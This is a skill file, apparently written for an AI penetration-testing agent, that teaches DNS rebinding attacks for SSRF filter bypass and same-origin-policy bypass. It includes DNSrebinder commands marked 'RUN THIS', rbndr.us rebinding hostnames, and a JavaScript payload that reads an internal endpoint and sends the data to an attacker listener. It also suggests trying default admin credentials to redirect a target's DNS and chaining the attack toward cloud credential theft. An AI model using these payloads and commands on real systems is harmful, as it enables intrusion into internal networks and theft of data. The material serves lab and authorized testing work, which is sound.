---
name: dns-rebinding
description: DNS Rebinding attacks — Same-Origin Policy bypass to access internal applications, and SSRF filter bypass when the server resolves a hostname twice (check-then-use pattern). Use when HauntMode identifies SSRF filters that check hostname/IP validity at a different point than where the request is made, or when testing internal-network-accessible targets with browser-based access.
---

# DNS Rebinding — SOP Bypass and SSRF Filter Bypass

Grounded in the CWEE Modern Web Exploitation Techniques module. Covers both attack vectors: browser-based SOP bypass (internal network recon from victim's browser) and server-side SSRF filter bypass via the check-then-use pattern.

---

## 1. Triggers — when this skill applies

**For SSRF filter bypass:**
- The server resolves a user-supplied hostname in a filter check AND then resolves it again when making the actual request (two separate DNS lookups)
- SSRF filter uses `socket.gethostbyname()` or similar to check the IP, but then calls `requests.get(url)` separately
- The filter blocks direct IP addresses (127.0.0.1, 192.168.x.x) but allows domain names
- Source code shows: `ip = resolve(domain); if not private(ip): fetch(url)` — two resolution points

**For SOP bypass (browser-based):**
- Target is an internal application accessible only from within a specific network
- The attacker can lure a victim (who is on that internal network) to visit an attacker-controlled page
- The internal app does NOT require authentication (or uses IP-based auth)
- The internal app and attacker server use the same port

**Both vectors require:**
- Control over a domain name and its DNS configuration
- Ability to set a very low TTL (0–1 second)

---

---

## 3. Core concept

DNS TTL allows an attacker who controls a domain to change what IP it resolves to between two sequential DNS lookups. The attack exploits the window between:
1. **First lookup** (during the security check): domain resolves to a benign external IP → passes the filter
2. **Second lookup** (during the actual request): domain resolves to `127.0.0.1` → accesses internal/local resource

The attacker controls the rebind timing by setting TTL=0 and configuring the DNS server to alternate between IP addresses.

---

## 4. Identifying the SSRF filter bypass pattern

Look for code or behavior where:

```python
# Vulnerable pattern — two DNS resolutions
def index():
    url = request.form['url']
    hostname = urlparse(url).hostname
    ip = socket.gethostbyname(hostname)       # First resolution — filter check
    if not ip_address(ip).is_private:
        return requests.get(url).text          # Second resolution — actual fetch
```

The `requests.get(url)` call resolves the hostname again. Between the two calls, DNS rebinding can change the resolution.

**Signs of this pattern without source code:**
- Filter blocks IPs like `127.0.0.1` but allows domain names
- The filter appears to be SSRF-aware (blocks RFC1918 ranges)
- But you can still provide domain names that resolve to public IPs

---

## 5. Attack tools

### 5.1 rbndr.us — quick/easy (public internet connectivity required)

Generate a rebinding domain at: `https://lock.cmpxchg8b.com/rebinder.html`

- Set **A** = `1.1.1.1` (the external IP that passes the filter)
- Set **B** = `127.0.0.1` (the target internal IP)
- Generated hostname: `7f000001.01010101.rbndr.us` (resolves randomly to one of the two IPs)

Usage:
```bash
# Provide this URL to the SSRF endpoint
http://7f000001.01010101.rbndr.us/flag
```

May require multiple attempts since the resolution is random.

### 5.2 DNSrebinder — precise control (works without internet connectivity)

Clone: `git clone https://github.com/mogwailabs/DNSrebinder`

Run a rogue DNS server that responds to `attacker.com`:
- **First query** → `1.1.1.1` (passes the SSRF filter)
- **All subsequent queries** → `127.0.0.1` (hits the internal endpoint)

```
[RUN THIS]
sudo python3 dnsrebinder.py \
  --domain attacker.com \
  --ip 1.1.1.1 \
  --rebind 127.0.0.1 \
  --counter 1 \
  --tcp --udp
```

Then point the target application's DNS to your machine (e.g., via Webmin admin panel if accessible):
- Networking → Network Configuration → Hostname and DNS Client → DNS Servers → set to your IP

### 5.3 rbndr.us for specific IP pairs

```
# Format: HEXIP1.HEXIP2.rbndr.us
# where HEXIP = 4 hex octets of the IP address

# For 127.0.0.1 and 1.1.1.1:
# 127.0.0.1 = 7f000001
# 1.1.1.1   = 01010101
http://7f000001.01010101.rbndr.us/target-path

# For 127.0.0.1 and your public IP:
# Convert public IP to hex first
printf "%02x%02x%02x%02x" 1 2 3 4  # = 01020304
```

---

## 6. SSRF filter bypass — step-by-step

**Preconditions:** You have control of `attacker.com` and have configured DNSrebinder pointing to your machine (per section 5.2). The target DNS has been redirected to your machine (if no internet — section 5.2; if internet-connected, use rbndr.us).

**Steps:**

1. Start DNSrebinder (as above)
2. Submit the URL `http://attacker.com/flag` (or whatever internal path you want to access) to the vulnerable SSRF endpoint
3. DNSrebinder will reply to the first DNS query with `1.1.1.1` → the SSRF filter passes
4. The second DNS query (when `requests.get` resolves the domain) gets replied with `127.0.0.1`
5. The application fetches `http://127.0.0.1/flag` from its own loopback → you get the internal content

**Timing:** The rebind must happen between the filter check DNS call and the actual fetch DNS call. DNSrebinder's `--counter 1` handles this: the first query of a new host gets IP #1, all subsequent get IP #2. Since the filter check and the fetch happen milliseconds apart, typically the first HTTP request triggers two DNS queries (filter + fetch), and DNSrebinder correctly maps them.

---

## 7. Same-Origin Policy bypass — browser-based

**Use case:** Exfiltrate data from an internal application that the victim's browser can reach but you cannot.

**Attack chain (5 steps):**

1. Register `attacker.htb` and configure it to resolve to your web server's public IP, with TTL=0
2. Serve the following malicious JavaScript payload at `http://attacker.htb:PORT/` (PORT must match the internal app's port)
3. The victim visits `http://attacker.htb:PORT/` — their browser loads the JS payload from your server
4. You update/rebind `attacker.htb` DNS to resolve to the internal app's IP (e.g., `192.168.1.100`)
5. The JS payload (running in the victim's browser, with origin `http://attacker.htb:PORT`) makes a fetch to `http://attacker.htb:PORT/secret` — now resolves to `192.168.1.100:PORT` — same origin, no SOP block

**Malicious payload:**
```html
<script>
function attack() {
    var xhr = new XMLHttpRequest();
    // Replace with the internal endpoint you want to read
    xhr.open('GET', 'http://www.attacker.htb/api/secret', true);
    xhr.onload = function() {
        // Exfiltrate the response to a different subdomain
        fetch('http://exfil.attacker.htb:1337/log?data=' + btoa(xhr.response));
    };
    xhr.send();
}
// Call every 2 seconds to increase chance of hitting the rebind window
setInterval(attack, 2000);
attack();
</script>
```

Start exfil listener: `python3 -m http.server 1337` (check logs for `?data=` parameter)

Decode exfiltrated data: `echo "BASE64VALUE" | base64 -d`

**Start the DNSrebinder (for internal web app access):**
```
[RUN THIS]
sudo python3 dnsrebinder.py \
  --domain www.attacker.htb \
  --rebind 192.168.1.100 \
  --ip YOUR_PUBLIC_IP \
  --counter 1 \
  --tcp --udp
```

---

## 8. Preconditions and restrictions

| Requirement | SSRF bypass | SOP bypass |
|---|---|---|
| Control a domain | Yes | Yes |
| Ability to set low TTL | Yes | Yes |
| Target makes 2 DNS lookups | Yes | N/A |
| Victim must visit attacker page | No | Yes |
| Victim must stay on page during rebind | No | Yes (~60s minimum) |
| Internal app must be unauthenticated | No | Yes (session cookies not sent) |
| Ports must match | No | Yes |

**Browser DNS caching:** Modern browsers cache DNS for configurable periods regardless of TTL. The payload calls itself every 2 seconds to keep trying. Firefox setting: `network.dnsCacheExpiration`. In practice, wait ~60s for the rebind to succeed.

**Authentication restriction:** For SOP bypass, since `attacker.htb` resolves to the internal IP only after rebinding, the victim's session cookies for `192.168.1.100` are NOT sent (different origin). This makes the attack suitable for unauthenticated endpoints or IP-based auth only.

---

## 9. Alternate DNS rebinding for local environments

If the target has no internet access, you need to redirect its DNS resolver to your machine. Common paths:
- Webmin at `target:10000` → Networking → Hostname and DNS Client → DNS Servers
- PiHole admin panel → change upstream DNS
- PRTG Network Monitor → network settings
- ManageEngine → DNS configuration

If any of these admin interfaces are accessible (check default credentials: admin/(blank), admin/admin), update the DNS server to point to your attacker IP.

---

## 10. False-positive checks

- **Single DNS resolution:** If the filter and the fetch use the same already-resolved IP (not a re-lookup), DNS rebinding won't work. Confirm by checking if providing a domain vs. IP behaves differently.
- **DNS pinning:** Some servers cache the DNS resolution for longer than the TTL. The rbndr.us randomized approach compensates for this; with DNSrebinder, increase the retry count.
- **Same-origin but cross-port:** If the internal app runs on port 8080 and your attacker server runs on 80, the origin differs — SOP still applies. The port must match exactly.
- **Internal app uses authentication:** If authentication is required (cookies, Bearer token), the SOP bypass won't work unauthenticated. IP-based auth is the exception.
- **WC3 Local Network Access header:** Modern Chromium may require `Access-Control-Allow-Local-Network` header from the internal app. This header is unlikely to be set on internal-only apps in most environments, but check if requests are blocked.

---

## 11. Chain candidates

| Chain | Other skill | Impact uplift |
|---|---|---|
| DNS rebinding → SSRF filter bypass → internal API | `ssrf` | Access to internal services bypassing IP filter |
| DNS rebinding → SSRF → cloud metadata | `ssrf` | AWS/GCP/Azure credential theft |
| DNS rebinding → SOP bypass → internal admin exfil | `xss` (exfil pattern) | Internal data disclosure |
| DNS rebinding → internal app accessible → IDOR | `idor` | Access control bypass on internal service |
| DNS rebinding SSRF → port scan | `ssrf` | Internal network mapping |

---

## 12. Reporting template

```
POTENTIAL FINDING: DNS Rebinding — [SSRF Filter Bypass | SOP Bypass]
Target: <URL of the vulnerable endpoint>
Type: <SSRF filter bypass (server-side) | SOP bypass (browser-based)>

Vulnerable pattern:
  <For SSRF: "The server resolves the provided hostname twice — once in the IP filter
   check (socket.gethostbyname) and once when fetching the URL (requests.get),
   with no caching between calls">
  <For SOP: "Internal app at 192.168.x.x accessible unauthenticated from victim's
   browser; attacker page served from same origin after DNS rebinding">

Attack chain:
  1. Attacker registers domain with TTL=0
  2. First DNS query: domain resolves to 1.1.1.1 (passes SSRF filter)
  3. DNS record rebound to 127.0.0.1
  4. Second DNS query: domain resolves to 127.0.0.1 (internal access achieved)

Evidence:
  <DNSrebinder output showing first query → 1.1.1.1, second → 127.0.0.1>
  <Response showing internal content was returned>

Internal endpoint accessed: <http://127.0.0.1/flag | http://192.168.x.x/api/secret>
Impact:
  <e.g. "Attacker can access any localhost-only endpoint on the application server"
   or "Internal admin API readable from victim's browser without authentication">

Preconditions for attacker: <domain ownership, DNSrebinder running, DNS redirected>
Preconditions for victim (SOP): <must visit attacker page, keep tab open ~60s>

Chain potential: <SSRF → cloud metadata | internal admin API | internal service IDOR>
Next step: <probe all localhost ports | enumerate internal API endpoints | exfil admin data>
```

---

## 13. Recon tracker vector strings

Only log if the user explicitly authorizes:

- `dns-rebinding:ssrf-filter-bypass:<endpoint>` — confirmed SSRF filter bypass via rebinding
- `dns-rebinding:sop-bypass:<internal-ip>` — SOP bypass to internal app confirmed
- `dns-rebinding:two-lookup-pattern:<endpoint>` — vulnerable pattern identified, not yet exploited
- `dns-rebinding:no:<endpoint>` — single DNS lookup, not vulnerable

---

## 14. What NOT to do

- **Do not redirect the DNS of production infrastructure** without researcher authorization — changing Webmin/PiHole DNS settings can disrupt production services.
- **Do not probe all localhost ports via SSRF** without researcher authorization — this is automated scanning behavior.
- **Do not leave the rogue DNS server running** after testing — it may continue intercepting DNS queries.
- **Do not claim DNS rebinding without confirming the two-lookup pattern** — verify that the filter and fetch use separate DNS resolutions before reporting.
- **Do not exfiltrate real internal user data** beyond what's necessary to prove the vuln.
- **Do not auto-log to the recon tracker** without explicit user instruction.
